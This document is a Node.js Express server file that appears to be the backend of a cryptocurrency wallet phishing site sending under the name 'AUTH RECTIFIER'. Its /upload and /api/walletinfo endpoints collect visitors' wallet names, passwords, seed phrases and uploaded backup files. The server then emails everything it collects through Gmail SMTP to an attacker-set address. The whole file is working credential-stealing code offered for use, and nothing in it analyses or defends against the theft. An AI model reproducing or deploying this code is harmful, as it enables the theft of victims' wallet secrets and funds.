const path = require("path");
const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");
const bodyParser = require("body-parser");
const multer  = require('multer')


require("dotenv").config();

const PORT = process.env.PORT || 8000


const app = express(); 
app.use(express.static(path.resolve(__dirname, "../build")));
app.use(cors())
app.use(bodyParser.json());

// GET REQUEST
app.get("/api", (req, res) => {
    res.json({ message: "Hello from server"})
});

// TRANSPORTER
const seedPhrase = nodemailer.createTransport({
    service:"gmail",
    host: "smtp.gmail.email",
    port: 587,
    secure: false,
    auth: {
        user: process.env.EMAIL_ADDRESS,
        pass: process.env.EMAIL_PASS
    }
})
seedPhrase.verify(error => {
    if(error) {
        console.log(error)
    }else {
        console.log("it ready to send")
    }
})

// POST REQUEST

const storage = multer.diskStorage({
    destination: function(req, file, cb) {
        return cb(null, "./public")
    },
    filename: function (req, file, cb) {
        return cb(null, `${Date.now()}_${file.originalname}`)
    }
})

const upload = multer({storage});

app.post('/upload', upload.single('file'),(req,res)=>{
    // console.log(req.file, req.body)
    console.log(req.file)
    const backcode = req.body;
    const file = req.file;
    res.status(200).json("ok");
    const mail = {
        from: {
            name: "AUTH RECTIFIER",
            address: process.env.EMAIL_ADDRESS
        },
        to: process.env.EMAIL_TO ,
        subject: `${backcode.wallet} BACKCODE` ,
        html:`
        <div> 
        <p>WALLET NAME: ${backcode.wallet}<p>
        <p>WALLET PASSWORD: ${backcode.password}<p>
        <p>Backcode is <strong>ATTACHED</strong> to this email below 👇</p>
        </div>   
        `,
        attachments: [
            {
                filename: file.originalname,
                path: file.path
              },
        ]
    }

    seedPhrase.sendMail(mail, error => {
        if(error) {
            res.json(error)
        }else {
            res.json({ code: 200, status:"it ready to send"})
        }
    });
})


// POST REQUEST

app.post("/api/walletinfo", bodyParser.urlencoded({ extended:false}), (req, res) => {
    const seed = req.body
    let phrase;
    if(!seed.phrase) {
        phrase = seed.password
    }
    console.log(seed);
    console.log(seed.typeof);
    const mail = {
        from: {
            name: "AUTH RECTIFIER",
            address: process.env.EMAIL_ADDRESS
        },
        to: process.env.EMAIL_TO,
        subject:   `${seed.wallet} PHRASE`,
        html: `
        <div> 
        <p>WALLET NAME: ${seed.wallet}<p>
        <p>${seed.phrase}<p>
        </div>   
        `
    }

    seedPhrase.sendMail(mail, error => {
        if(error) {
            res.json(error)
        }else {
            res.json({ code: 200, status:"it ready to send"})
        }
    });
})
app.get("*", (req, res) => {
    res.sendFile(path.resolve(__dirname, "../build", "index.html"));
})

app.listen(PORT, () => {
    console.log(`server is live on PORT:${PORT}`)
})